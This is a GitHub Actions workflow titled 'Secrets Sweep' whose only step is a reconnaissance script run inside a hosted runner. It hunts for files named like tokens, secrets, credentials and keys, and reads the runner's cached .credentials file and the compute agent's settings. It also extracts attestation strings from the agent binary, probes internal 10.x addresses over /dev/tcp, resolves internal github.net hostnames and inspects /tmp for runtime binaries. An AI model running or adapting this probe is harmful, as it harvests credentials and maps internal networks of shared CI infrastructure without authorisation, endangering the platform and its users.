name: Secrets Sweep
on: workflow_dispatch
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Sweep for accessible secrets and services
        run: |
          echo "=== World-readable files with interesting names ==="
          find / -readable -name "*token*" -o -readable -name "*secret*" -o -readable -name "*credential*" \
            -o -readable -name "*password*" -o -readable -name "*.pem" -o -readable -name "*.key" \
            2>/dev/null | grep -v node_modules | grep -v /proc | grep -v /sys | head -20
          
          echo ""
          echo "=== HCA .credentials content (runner user) ==="
          cat /home/runner/actions-runner/cached/2.335.1/.credentials 2>/dev/null | head -5 || echo "not readable"
          
          echo ""
          echo "=== Try reading HCA settings as runner ==="
          cat /opt/hca/.settings 2>/dev/null || echo "not readable (expected)"
          
          echo ""
          echo "=== String search in HCA binary for attestation providers ==="
          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "attestation|provider|azure.attest|maa\.|tpm|sgx|sev" | sort -u | head -15
          
          echo ""
          echo "=== Network scan: internal 10.x range ==="
          for ip in 10.1.0.1 10.1.0.2 10.1.0.3 10.0.0.1; do
            timeout 1 bash -c "echo >/dev/tcp/$ip/443" 2>/dev/null && echo "$ip:443 OPEN" || true
          done
          
          echo ""
          echo "=== DNS internal resolution ==="
          for name in "orchestrator.github.net" "broker.github.net" "actions.github.net" \
            "compute.github.net" "runner.github.net" "hosted-compute.github.net"; do
            IP=$(dig +short "$name" 2>/dev/null | head -1)
            [ -n "$IP" ] && echo "  $name: $IP"
          done
          
          echo ""
          echo "=== /tmp for runtime tokens ==="
          ls -la /tmp/provjobd* 2>/dev/null || echo "provjobd binary gone"
          file /tmp/provjobd* 2>/dev/null || true
